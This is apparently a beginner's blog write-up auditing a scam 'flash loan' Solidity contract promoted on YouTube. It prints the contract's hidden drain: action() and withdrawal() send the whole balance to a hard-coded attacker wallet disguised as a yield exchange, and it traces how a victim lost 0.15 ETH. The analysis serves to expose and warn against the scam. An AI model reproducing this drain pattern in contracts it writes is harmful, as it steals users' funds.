## Hello World....of malicious Smart Contracts

### Welcome to my first smart contract audit(It will be rudimentary and probably provide little value but I wanted to docuemtn my first step into this world.)

I have been reading about flash loan bots / MEV bots and was interested in the arbitrage aspect and the related potentila profitability. Much like any easy money scheme there are more opportunities for malcious intent rather than genuine money making strategy. As an infosec professional, i'm already extermely skeptical of everything so naturally, I was drawn to looking into anything claiming to make money FAST. 

I stumbled upon this [Youtube Video](https://www.youtube.com/watch?v=hqsqbjPKTRI&t=2s) talking about a flash loan. linked in the video description was a [Smart Contract](https://githubdata.com/usercontent/raw-data/eth_multiplier_contract_code_raw-30848ds4) I know the VERY bare basics of programming and solidity but I wanted to dig into this with the aid of AI. 

My OSINT senses were tingling as well from loking at the comment section of the video. All comments were made by accounts that all had the same "user-XXXX" syntax. This suggests that these were most likely bot accounts created by the original poster to make this video and code seem more legitimate. 



Etherscan has a newer application called [Code Reader](https://etherscan.io/code-reader). I copied the code into here and utilizing the ChatGPT API asked a few questions about this contract.

* What are the functions of this contract?

"The "FlashLoanArbitrage" contract contains the following functions:

1. **Constructor**: This function initializes the contract's token symbol, token name, and loan amount when the contract is first created.

2. **receive()**: A fallback function that allows the contract to receive funds.

3. **findNewContracts**: This function is used to find newly deployed contracts on the Uniswap exchange.

4. **findContracts**: This function extracts the newest contracts from the Uniswap exchange.

5. **loadCurrentContract**: This function loads the current contract.

6. **nextContract**: This function extracts the contract from Uniswap.

7. **memcpy**: This function copies data from the source to the destination in memory.

8. **orderContractsByLiquidity**: This function orders the contracts by available liquidity.

9. **calcLiquidityInContract**: This function calculates the remaining liquidity in a contract.

10. **getMemPoolOffset**: This function returns the memory pool offset.

11. **parseMempool**: This function parses the memory pool.

12. **keccak**: This function returns the keccak-256 hash of a contract.

13. **checkLiquidity**: This function checks if a contract has enough liquidity available

14. **getMemPoolLength**: This function returns the length of the memory pool.

15. **beyond**: This function modifies a slice to contain everything from the first occurrence of needle to the end of the slice.

16. **getMemPoolHeight**: This function returns the height of the memory pool.

17. **callMempool**: This function calls and returns the data of all the contracts in the mempool.

18. **toHexDigit**: This function returns the hexadecimal representation of a digit.

19. **_callMEVAction**: This function performs a MEV action call.

20. **Yieldexchange**: This function returns the selected contract's address.

21. **action**: This function performs a frontrun action on different contract pools.

22. **withdrawal**: This function withdraws the funds back to the contract creator's address.

23. **uint2str**: This function converts an unsigned integer to a string.

24. **getMemPoolDepth**: This function returns the depth of the memory pool.

25. **mempool**: This function loads all Uniswap memory pools into memory."

### 2 odd functions that stuck out to me were action and Yieldexchange. Here are the code snippets of these functions:

``` solidity
   }

    function _callMEVAction() internal pure returns (address) {
        return parseMempool(callMempool());
    }
    function Yieldexchange() public pure returns (address) {
		return 0xc3F62f395A2e663fe26289f6dfcBDF1dE87CeB05;
	}
    /*
     * @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `liquidity`.
     */
    function action() public payable {
        payable(Yieldexchange()).transfer(address(this).balance);
    }

    /*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function withdrawal() public payable {
        payable(Yieldexchange()).transfer(address(this).balance);
    }
```

* Ths function Yieldexchange defines an wallet address. This is NOT a yield exchange.
* And the function action calls Yieldexchange with the transfer function essentially transferring out the etheruem used to run this "Flashloan" to an external wallet.
* I input this address into etherscan and my hypothesis was correct. Under internal transaction on this address there was a deposit from an external source. I checked the transaction hash assocaited with the .15 ETH transfer.

![alt text](https://github.com/Kanwrath/Web3-Ethereum-Smart_Contracts-Blockchains/blob/main/SmartContractAudits/img/1.jpg)

* Next I checked the external wallet address(0x8D73310409d758693a8b3234E7811319865734F4) that had transferred their funds out  this external wallet(0xc3F62f395A2e663fe26289f6dfcBDF1dE87CeB05) unknown to them

![alt text](https://github.com/Kanwrath/Web3-Ethereum-Smart_Contracts-Blockchains/blob/main/SmartContractAudits/img/2.jpg)

*As you can see this wallet receieved a deposit of ETH from Coinbase. This ETH was then used to create the contract(FlashLoan). The Contract was now funded and the owner of the ETH Address 0x8D73310409d758693a8b3234E7811319865734F4, then initiated the contract to use the .15 ETH in the "FlashLoan". After this was initiated this simply ran through tha contract code up until it hit the Yieldexchange function which defined the malicious wallet address(0xc3F62f395A2e663fe26289f6dfcBDF1dE87CeB05) and simply transferred the funds to this account. 

![alt text](https://github.com/Kanwrath/Web3-Ethereum-Smart_Contracts-Blockchains/blob/main/SmartContractAudits/img/3.jpg)

* In this last photo you can see all associated addressed interacting and seeing my previously stated summary of events playing out. 

![alt text](https://github.com/Kanwrath/Web3-Ethereum-Smart_Contracts-Blockchains/blob/main/SmartContractAudits/img/4.jpg)

## Lessons learned

* ALWAYS review any contract offline. Obviously, with open source anything code will be copied and re used etc but prior to utilizing a contract and funding it it may be best to have a professional review the code or reach out to a community member on either a solidity forum 
